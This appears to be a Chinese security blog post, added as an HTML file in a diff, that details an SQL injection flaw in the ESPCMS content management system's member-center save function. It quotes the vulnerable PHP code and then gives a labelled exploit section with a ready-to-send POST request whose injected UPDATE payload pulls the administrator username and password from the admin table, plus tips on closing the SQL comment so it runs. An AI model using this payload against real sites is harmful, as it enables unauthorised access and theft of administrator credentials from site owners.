@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+  <title>易思ESPCMS企业网站管理系统V5.6.13.04.03的会员中心模块SQL注入漏洞 | Blog of Secer</title>
+  <meta name="description" content="" />
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="MobileOptimized" content="320" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
+  <link rel="stylesheet" type="text/css" href="/css/style.css" />
+  <meta name="generator" content="Blog of Secer">
+
+  
+  
+  
+
+  
+</head>
+
+<!--
+<body class="post-template">
+-->
+<body class="home-template">
+<div id="perspective" class="perspective effect-movedown">
+  <div class="container">
+    <!-- wrapper -->
+    <div class="wrapper">
+
+      <header class="site-head"  style="background: #24282b url(/img/img-bg.jpg) 0 -20%" >
+    <div class="vertical">
+        <div class="site-head-content inner">
+             <a class="blog-logo" href="/"><img src="/img/logo.svg" alt="Blog Logo"/></a> 
+            <h1 class="blog-title">Blog of Secer</h1>
+            <h2 class="blog-description"><button id="showMenu">Show Menu</button></h2>
+        </div>
+    </div>
+</header>
+
+      
+
+<main class="content" role="main">
+  <article class="post">
+    <span class="post-meta">
+      <time datetime="2013-04-11T08:41:59.000Z" itemprop="datePublished">
+          2013-04-11
+      </time>
+    
+    
+    | 
+    <a href='/tag/漏洞/'>漏洞</a>,
+    
+    <a href='/tag/SQL注入/'>SQL注入</a>,
+    
+    <a href='/tag/Espcms/'>Espcms</a>
+    
+    
+</span>
+    <h1 class="post-title">易思ESPCMS企业网站管理系统V5.6.13.04.03的会员中心模块SQL注入漏洞</h1>
+    <section class="post-content">
+      <p><a href="http://ha.cker.in/tag/Espcms" target="_blank">Espcms</a> <a href="http://ha.cker.in/tag/SQL注入" target="_blank">SQL注入</a><a href="http://ha.cker.in/tag/漏洞" target="_blank">漏洞</a> 第二弹     <br><a href="http://team.f4ck.net/thread-10337-1-1.html" target="_blank" rel="external">http://team.f4ck.net/thread-10337-1-1.html</a></p>  <p>   <br>易思<a href="http://ha.cker.in/tag/Espcms" target="_blank">ESPCMS</a>企业网站管理系统基于LAMP开发构建的企业网站管理系统。     <br>易思<a href="http://ha.cker.in/tag/Espcms" target="_blank">ESPCMS</a>企业网站管理系统V5.6.13.04.03的会员中心模块存在<a href="http://ha.cker.in/tag/SQL注入" target="_blank">SQL注入</a>漏洞，攻击者可利用此漏洞破坏应用，执行未授权操作。</p>  <p>漏洞文件: interface/membermain.php    <br></p>  <pre>function in_save() {<br>                parent::start_pagetemplate();<br>                parent::member_purview();<br>                $lng = (admin_LNG == ‘big5’) ? $this-&gt;CON[‘is_lancode’] : admin_LNG;<br>                $inputclass = $this-&gt;fun-&gt;accept(‘inputclass’, ‘R’);<br>                $upurl = $this-&gt;fun-&gt;accept(‘upurl’, ‘R’);<br>                $userid = intval($this-&gt;fun-&gt;accept(‘userid’, ‘P’));<br>                $username = $this-&gt;fun-&gt;accept(‘username’, ‘P’);<br>                if (empty($userid) || empty($username)) {<br>                        $linkURL = $this-&gt;mlink[‘center’];<br>                        $this-&gt;callmessage($this-&gt;lng[‘member_edit_ok’], $linkURL, $this-&gt;lng[‘gobackurlbotton’]);<br>                }<br>                $email = trim($this-&gt;fun-&gt;accept(‘email’, ‘P’));<br>                $question = trim($this-&gt;fun-&gt;accept(‘question’, ‘P’, true, true));<br>                $answer = trim($this-&gt;fun-&gt;accept(‘answer’, ‘P’, true, true));<br>                $alias = trim($this-&gt;fun-&gt;accept(‘alias’, ‘P’, true, true));//通过一个accept函数,确定为post提交<br>                $sex = $this-&gt;fun-&gt;accept(‘sex’, ‘P’);//注得就是你了.$sex可控,<br>                $sex = empty($sex) ? 0 : $sex;<br>                $tel = trim($this-&gt;fun-&gt;accept(‘tel’, ‘P’, true, true));<br>                $mobile = trim($this-&gt;fun-&gt;accept(‘mobile’, ‘P’, true, true));<br>                $birthday = $this-&gt;fun-&gt;accept(‘birthday’, ‘P’);<br>                $birthday = empty($birthday) ? 0 : $this-&gt;fun-&gt;formatdate($birthday, 4);<br>                $country = intval($this-&gt;fun-&gt;accept(‘cityone’, ‘P’));<br>                $country = empty($country) ? 0 : $country;<br>                $province = intval($this-&gt;fun-&gt;accept(‘citytwo’, ‘P’));<br>                $province = empty($province) ? 0 : $province;<br>                $city = intval($this-&gt;fun-&gt;accept(‘citythree’, ‘P’));<br>                $city = empty($city) ? 0 : $city;<br>                $district = intval($this-&gt;fun-&gt;accept(‘district’, ‘P’));<br>                $district = empty($district) ? 0 : $district;<br>                $address = trim($this-&gt;fun-&gt;accept(‘address’, ‘P’, true, true));<br>                $zipcode = trim($this-&gt;fun-&gt;accept(‘zipcode’, ‘P’, true, true));<br>                $zipcode = empty($zipcode) ? 0 : $zipcode;<br>                $msn = trim($this-&gt;fun-&gt;accept(‘msn’, ‘P’, true, true));<br>                $qq = $this-&gt;fun-&gt;accept(‘qq’, ‘P’);<br>                $qq = empty($qq) ? 0 : $qq;<br><br>                $db_table = db_prefix . ‘member’;<br>                $db_table2 = db_prefix . ‘member_value’;</pre><br><br><p>下面来看看怎么进行入库处理的吧。<br>  <br>$db_where = ‘userid=’ . $userid;<br><br>  <br>$db_set= &quot;sex=$sex,birthday=$birthday,country=$country,province=$province,city=$city,district=$district,alias=’$alias’,address=’$address’,zipcode=$zipcode,tel=’$tel’,mobile=’$mobile’,qq=$qq,msn=’$msn’&quot;;<br><br>  <br>$this-&gt;db-&gt;query(‘UPDATE ‘ . $db_table . ‘ SET ‘ . $db_set . ‘ WHERE ‘ . $db_where);</p>
+
+<p>Update注入,看了下数据库,address为varchar。</p>
+
+<p>因为这个cms有个防报错的函数,构造遇到了点麻烦,一出错就显示Can not connect to Mysql server,<br>  <br>&#160;</p>
+
+<p>追踪下此函数:<br>  <br></p>
+
+<pre>function halt($message = '', $sql = '') { 
+                $db_err = !db_err ? 0 : db_err; 
+                $db_sql = !db_sql ? 0 : db_sql; 
+                $mysqlinfo = '&lt;font size=&quot;2&quot;&gt;&lt;b&gt;ESPCMS SQL Error:&lt;/b&gt; Can not connect to MySQL server&lt;b&gt;Time:&lt;/b&gt;' . date('e Y-m-d H-i-s', time()); 
+                $mysqlinfo.= $db_sql ? '&lt;b&gt;SQL:&lt;/b&gt;' . $sql : ''; 
+                $mysqlinfo.= $db_err ? '&lt;b&gt;Error：&lt;/b&gt;' . mysql_error() : ''; 
+                $mysqlinfo.= '&lt;a target=&quot;_blank&quot; href=&quot;http://www.espcms.com&quot;&gt;http://www.espcms.com&lt;/a&gt; Access Query Errors&lt;/font&gt;'; 
+
+                exit($mysqlinfo); 
+        }</pre>
+
+<p>为了方便构造, 把出错的sql语句和出错的提示都打印出来。<br>  <br>sex=1,birthday=2013-04-02,country=0,province=0,city=0,district=0,alias=1,address=(select concat(username,CHAR(0x7c),password) from espcms_admin_member limit 1),zipcode=0,tel=0,mobile=0,qq=0,msn=0/<em>&amp;birthday=2013-04-02&amp;cityone=0&amp;citytwo=0&amp;citythree=0&amp;district=0&amp;address=12&amp;zipcode=0&amp;tel=&amp;mobile=&amp;msn=&amp;qq=</em>/</p><br><a id="more"></a><br><p>以上为原文。</p>
+
+<p>以下为<a href="http://ha.cker.in/tag/漏洞" target="_blank">漏洞</a>利用备注：<br><br>  <br>EXP<br><br>  <br>POST的数据包： </p>
+
+<p>POST /index.php?ac=membermain&amp;at=save<br>  <br>upurl=http%3A%2F%2F192.168.29.173%2Fespcms%2Fespcms_utf8_5.6.13.03.11_b%2Findex.php%3Fac%3Dmembermain%26at%3Deditpassword&amp;inputclass=editinfo&amp;userid=1&amp;username=test1&amp;email=test%4011.com&amp;mvid=&amp;alias=1&amp;sex=1,birthday=2013-04-02,country=0,province=0,city=0,district=0,alias=1,address=(select concat(username,0x7c,password) from espcms_admin_member limit 1),/<em>&amp;qq=</em>/&amp;submit=%E7%A1%AE%E8%AE%A4%E4%BF%AE%E6%94%B9%E8%B5%84%E6%96%99</p>
+
+<p>注意：<br>  <br>这里address添加注射语句：(select concat(username,0x7c,password) from espcms_admin_member limit 1),/<em><br><br>  <br>POST的参数zipcode或者qq为</em>/ ，是和前面的闭合，此处若不提交则程序会给zipcode和qq赋上默认值“0”，且语句的注释符无法闭合会导致报错。</p>
+
+<p><br>  <br>刚开始没搞懂这里，在/interface/membermain.php里250行下添加：<br><br>  <br>echo $db_set;</p>
+
+<p>发包时回显出数据库中的语句就是<br>  <br>sex=1,birthday=2013-04-02,country=0,province=0,city=0,district=0,alias=1,address=(select concat(username,0x7c,password) from espcms_admin_member limit 1)/<em>,birthday=0,country=0,province=0,city=0,district=0,alias=’1’, address=’’,zipcode=0,tel=’’,mobile=’’,qq=</em>/,msn=’’<br><br>  <br>语句闭合，注入执行。</p>
+    </section>
+    <footer class="post-footer">
+      <section class="author">
+    <h4>Secer</h4>
+    <p>记录互联网安全历程与个人成长经历</p>
+</section>
+      <section class="share">
+    <h4>Share this post</h4>
+    <a class="icon-sina-weibo" href="http://v.t.sina.com.cn/share/share.php?title=记录互联网安全历程与个人成长经历 ?url=http://ha.cker.in/989.seo/" target="_blank">
+        <span class="hidden">weibo</span>
+    </a>
+    <a class="icon-twitter" href="http://twitter.com/share?url=http://ha.cker.in/989.seo/"
+       onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <span class="hidden">Twitter</span>
+    </a>
+    <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://ha.cker.in/989.seo/"
+       onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <span class="hidden">Facebook</span>
+    </a>
+    <a class="icon-google-plus" href="https://plus.google.com/share?url=http://ha.cker.in/989.seo/"
+       onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
+        <span class="hidden">Google+</span>
+    </a>
+</section>
+
+    </footer>
+  </article>
+  <nav class="pagination" role="pagination">
+    
+    <a class="newer-posts" href="/990.seo/">
+        ← 易思ESPCMS Cookie注入
+    </a>
+    
+    <span class="icon-logo">•</span>
+    
+    <a class="older-posts" href="/988.seo/">
+        入侵韩国某购物网并提权 →
+    </a>
+    
+</nav>
+
+  <div id="comment" class="comments-area">
+    <h4 class="title"><a href="#disqus_comments" name="disqus_comments">Comments</a></h4>
+    
+</div>
+
+</main>
+
+
+      
+<footer class="site-footer">
+  
+  <div class="inner">
+     <section class="copyright">All content copyright <a href="/">Blog of Secer</a> &copy; 2014 &bull; All rights reserved.</section>
+     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
+  </div>
+</footer>
+
+      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
+<script type="text/javascript" src="/js/index.js"></script>
+<script type="text/javascript" src="/js/menu.js"></script>
+
+
+
+
+
+  </div>
+</div>
+
+<nav  class="outer-nav top horizontal">
+
+          <a class="icon-home"  href="/"><span>Home</span></a>
+
+          <a class="icon-news"  href="/archives"><span>Archive</span></a>
+
+          <a class="icon-image"  href="/images"><span>Images</span></a>
+
+          <a class="icon-wiki"  href="/wiki/"><span>Wiki</span></a>
+
+          <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>
+
+          <a class="icon-mail"  href="/about/"><span>Contact</span></a>
+
+</nav>
+
+</div>
+</body>
+</html>
